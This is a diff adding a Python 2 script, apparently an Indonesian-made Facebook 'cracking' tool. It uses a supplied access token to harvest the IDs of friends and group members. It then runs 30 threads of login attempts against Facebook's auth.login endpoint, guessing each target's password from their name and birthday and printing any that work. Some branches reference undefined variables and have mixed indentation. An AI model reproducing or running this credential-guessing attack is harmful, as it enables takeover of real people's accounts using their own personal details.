@@ -1,0 +1,374 @@
+import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib
+from multiprocessing.pool import ThreadPool
+
+try:
+    import requests
+except ImportError:
+    os.system("pip2 install requests")
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+
+try:
+    import mechanize
+except ImportError:
+    os.system("pip2 install mechanize")
+
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.1.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+info = time.strftime("%S:%M:%H")
+
+def quit():
+    print '\x1b[1;91m[!] Program Closed'
+    os.sys.exit()
+
+
+def loading(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.01)
+
+###########################################################################
+#                              Color                                      #
+###########################################################################
+
+
+R = '\033[1;91m'
+V = '\033[1;95m'
+W = '\033[1;97m'
+G = '\033[1;92m'
+N = '\033[1;0m'
+Y = '\033[1;93m'
+
+good = "\033[1;32m[\033[1;36m+\033[1;32m]\033[0m"
+bad = "\033[1;32m[\033[1;31m!\033[1;32m]\033[0m"
+#word
+success = "\033[1;32mSuccessful\033[0m"
+failed = "\033[1;31mFailed\033[0m"
+
+
+banner2 = """
+\033[1;93m _______  _____       _______ _____
+\033[1;94m |______ |     |      |  |  |   |  
+\033[1;95m ______| |_____|      |  |  | __|__
+                                   
+"""
+
+banner = """
+\033[1;93m _______  _____       _______ _____
+\033[1;94m |______ |     |      |  |  |   |  
+\033[1;95m ______| |_____|      |  |  | __|__
+                                   
+"""
+
+def load():
+    loading(G + '\r[*] Please Wait... \n')
+
+
+back = 0
+threads = []
+berhasil = []
+cekpoint = []
+gagal = []
+idfriends = []
+idfromfriends = []
+idmem = []
+id = []
+em = []
+emfromfriends = []
+hp = []
+hpfromfriends = []
+reaksi = []
+reaksigrup = []
+komen = []
+listgrup = []
+
+ids = ('ids.txt')
+
+
+##### TOKEN #####
+def login():
+	os.system('clear')
+	print banner
+	fb_token = raw_input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;97m")
+	try:
+		otw = requests.get('https://graph.facebook.com/me?access_token='+fb_token)
+		a = json.loads(otw.text)
+		fb_name = a['name']
+		pick = open("login.txt", 'w')
+		pick.write(fb_token)
+		pick.close()
+		menu()
+	except KeyError:
+		print "\033[1;91m[!] Wrong"
+		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
+		if e =="":
+			exit()
+		elif e =="y":
+			login()
+		else:
+			exit()
+
+def menu():
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        os.system('clear')
+        print R + '[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        try:
+            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
+            a = json.loads(otw.text)
+            nama = a['name']
+            id = a['id']
+            ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
+            b = json.loads(ots.text)
+            sub = str(b['summary']['total_count'])
+        except KeyError:
+            os.system('clear')
+            os.system('rm -rf login.txt')
+            time.sleep(1)
+            login()
+        except requests.exceptions.ConnectionError:
+            print banner
+            print '\x1b[1;91m[!]Please Check your Connection!'
+            quit()
+
+    os.system('clear')
+    print banner
+    print V+' Welcome'+N+' [ '+ G + nama + N+ ' ] '
+    print R+15 * '-'+G+'[ \033[1;97mMenu'+N+G+' ]'+R+ 15* '-'+N
+    print W + ' 1.' + G + ' Dump Group ID\'s'
+    print W + ' 2.' + G + ' Public Cracking'
+    print W + ' 8.' + G + ' Logout'
+    print W + ' 0.' + R + ' Exit'
+    print ''
+    pilih()
+
+
+def pilih():
+    zedd = raw_input(G + '>>' + R + '\xe2\x96\xb6 ' + W)
+    if zedd == '':
+        print '\x1b[1;91m [!] Empty command'
+        pilih()
+    elif zedd == '1':
+        dumpg()
+    elif zedd == '2':
+        super()
+    elif zedd == '3':
+        os.system('rm -rf login.txt')
+        quit()
+    elif zedd == '0':
+        os.system('clear')
+        print G + 'Bye Bye Tool Love Kaito <3'+N
+        raw_input(R + '[ ' + W + 'Quit' + R + ' ]' + N)
+        quit()
+    else:
+        print R + ' [+] Wrong Command!'
+        pilih()
+###########################################################################
+#                          Dump group id                                  #
+###########################################################################
+        
+def dumpg():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        os.system('clear')
+        print banner
+        loading(' Please wait ...')
+        print ''
+        try:
+            uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
+            group = json.loads(uh.text)
+            for p in group['data']:
+                nama = p['name']
+                id = p['id']
+                f = open('id.txt', 'w')
+                listgrup.append(id)
+                print G + '[+] Name ' + V + '-> ' + W + str(nama)
+                print G + '[-] ID   ' + V + '-> ' + W + str(id)
+                print ''
+
+            print '\n[+] Total Groups : %s' % len(listgrup)
+            f.close()
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            menu()
+        except (KeyboardInterrupt, EOFError):
+            print '\x1b[1;91m[!] Stopped'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            menu()
+        except KeyError:
+            print '\x1b[1;91m[!] Group not found'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            menu()
+        except requests.exceptions.ConnectionError:
+            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
+            quit()
+        except IOError:
+            print '\x1b[1;91m[!] Error when creating file'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            menu()
+
+###########################################################################
+#                          Start Cracking                                 #
+###########################################################################
+def super():
+    global toket
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+
+    os.system('clear')
+    print banner
+    print W + ' 1.' + G + ' Cracked from friends Facebook'
+    print W + ' 2.' + G + ' Cracked from Group Facebook'
+    print W + ' 3.' + G + ' Cracked from File ID'
+    print W + ' 0.' + R + ' Exit'
+    print ''
+    pilih_super()
+
+
+def pilih_super():
+    peak = raw_input(G + ' adapcsg\x1b[1;91m >\x1b[1;97m ')
+    if peak == '':
+        print '\x1b[1;91m[!] Empty command'
+        pilih_super()
+    elif peak == '1':
+        os.system('clear')
+        print banner
+        loading(G + '[+] ' + V + 'Cracking Please Wait...')
+        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
+        z = json.loads(r.text)
+        for s in z['data']:
+            id.append(s['id'])
+
+    elif peak == '2':
+        os.system('clear')
+        print banner
+        idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
+		try:
+			seat = requests.get("https://graph.facebook.com/"+idt+"?access_token="+fb_token)
+			op = json.loads(seat.text)
+			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
+		except KeyError:
+			print"\033[1;91m[!] Friend not found"
+			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+			super()
+		mkdir('\033[1;91m[✺] \033[1;92mGet all id from friend \033[1;97m...')
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+fb_token)
+		z = json.loads(r.text)
+		for i in z['data']:
+			id.append(i['id'])
+    
+    elif peak == '3':
+    	os.system('clear')
+    	try:
+    		print banner
+    		idlist = raw_input('\x1b[1;91m[+] \x1b[1;92m File ID  \x1b[1;91m:\x1b[1;97m')
+    		for line in open(idlist, 'r').readlines():
+    			id.append(line.strip())
+    	except:
+    		pass
+    
+    elif peak == '0':
+        menu()
+    else:
+        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mCan\'t be Empty'
+        pilih_super()
+    print G + '[+]' + V + ' Total ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
+    loading(G + '[=] Please wait \x1b[1;97m...\n')
+
+    def main(arg):
+        user = arg
+        try:
+            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
+            b = json.loads(a.text)
+            # Password Guess 1
+            pass1 = b['first_name'] + '123'
+            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass1
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass1
+            else:
+            	# Password Guess 2
+                pass2 = b['first_name'] + '12345'
+                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                q = json.load(data)
+                if 'access_token' in q:
+                    print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass2
+                elif 'www.facebook.com' in q['error_msg']:
+                    print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass2
+                else:
+                	# Password Guess 3
+                    pass3 = b['last_name'] + '123'
+                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass3
+                    elif 'www.facebook.com' in q['error_msg']:
+                        print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass3
+                    else:
+                    	# Password Guess 4
+                        birth = b['birthday']
+                        pass4 = birth.replace('/', '')
+                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                        q = json.load(data)
+                        if 'access_token' in q:
+                            print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass4
+                        elif 'www.facebook.com' in q['error_msg']:
+                            print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass4
+                        else:
+                            # Password Guess 5
+                            pass5 = b['last_name'] + '04'
+                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                            q = json.load(data)
+                            if 'access_token' in q:
+                            	print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass5
+                            elif 'www.facebook.com' in q['error_msg']:
+                            	print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass5
+                            else:
+                            	# Password Guess 6
+                            	pass6 = b['first_name'] + '04'
+                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                q = json.load(data)
+                                if 'access_token' in q:
+                                	print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass6
+                                elif 'www.facebook.com' in q['error_msg']:
+                            	    print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass6
+                                else:
+                                	pass
+                            		
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print '\n\x1b[1;91m[+] \x1b[1;97mFinish'
+    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+    super()
+
+
+
+if __name__ == '__main__':
+    login()
